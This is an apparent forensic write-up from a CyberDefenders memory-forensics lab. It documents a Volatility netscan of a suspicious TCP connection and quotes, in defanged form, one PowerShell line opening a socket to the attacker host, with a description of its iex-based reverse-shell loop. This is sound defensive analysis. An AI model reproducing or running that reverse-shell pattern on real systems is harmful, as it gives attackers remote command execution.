# Network Analysis

**Document Type:** Analysis  
**Case ID:** 006-memory-forensics-wmi-powershell-lsass-dump  
**Time Standard:** UTC  
**Source Platform:** CyberDefenders CyberRange  

## 1. Objective

Record the network state that netscan reports for the endpoint named in the exercise, and
the PowerShell code the range-supplied strings output associates with it.

## 2. Endpoint Under Review (Defanged)

| Item | Value | Basis |
|------|-------|-------|
| Remote endpoint | 10[.]0[.]128[.]2:4337 | Range-confirmed answer (Q8); present in netscan |
| Associated file | C:\Windows\System32\svchost.bat | Range-confirmed (Q8) |

## 3. Connection at Capture

Command as recorded (image path normalised to `memory.dmp`):

```
python vol.py -f memory.dmp --profile=Win10x64_17763 -g 0xf8034da8a4d8 netscan | Select-String -Pattern '10.0.128.2'
```

Observed result:

| Protocol | Local Address | Remote Address | State | Owner PID |
| :--- | :--- | :--- | :--- | :--- |
| TCPv4 | 10[.]0[.]128[.]0:63944 | 10[.]0[.]128[.]2:4337 | ESTABLISHED | -1 |

### Observations

- The connection was in state `ESTABLISHED` when the image was taken.
- The owner PID field is `-1`: netscan does not tie this connection to any process.
- The recorded row carries no creation time.
- Range-confirmed: the exercise accepted 63944 as the source port of the malicious session.
- Analyst inference: the ephemeral local port suggests the imaged host was the client side.

## 4. Code in the Range-Supplied Strings Output

`strings_out.txt` was supplied by the range; its derivation from the image was not
repeated. Parsed from it (defanged):

`$client = New-Object System.Net.Sockets.TCPClient('10[.]0[.]128[.]2',4337);`

The recorded excerpt continues with a loop that reads from the stream, evaluates received
data with `iex`, and converts the result with `Out-String`. The notes record no association
between the excerpt and `svchost.bat`; the exercise makes that association. Whether the
code executed, and in which process, is not recorded.

Analyst inference: the code is a basic reverse-shell pattern.

## 5. Timing

| Time (UTC) | Observation | Warrant |
| :--- | :--- | :--- |
| 2023-02-03 13:25:04 | MFT `$STANDARD_INFORMATION` values, `svchost.bat` | mftparser row, `UTC+0000` |
| 2023-02-03 13:29:33 | Memory image timestamp; connection `ESTABLISHED` at capture | imageinfo, `UTC+0000` |

The connection's start time is not recorded and is not inferred from the MFT value.

## 6. MITRE ATT&CK

No command-and-control technique is mapped. The recorded code opens a raw TCP socket and
no application-layer protocol was observed; port 4337 alone does not establish a
protocol-to-port mismatch; and no file transfer was observed. See the
[MITRE ATT&CK Mapping](mitre-attack-mapping.md), section "Considered and Not Mapped".

## 7. Network-Level Conclusion

- **Observed:** an ESTABLISHED TCP connection to `10[.]0[.]128[.]2:4337` from local port
  63944 at capture, with no recorded owner.
- **Range-confirmed:** the endpoint is the one used by `svchost.bat` and the session is
  malicious.
- **Not established:** the process that owned the connection, when it began, and its
  temporal relation to the LSASS dump invocation.
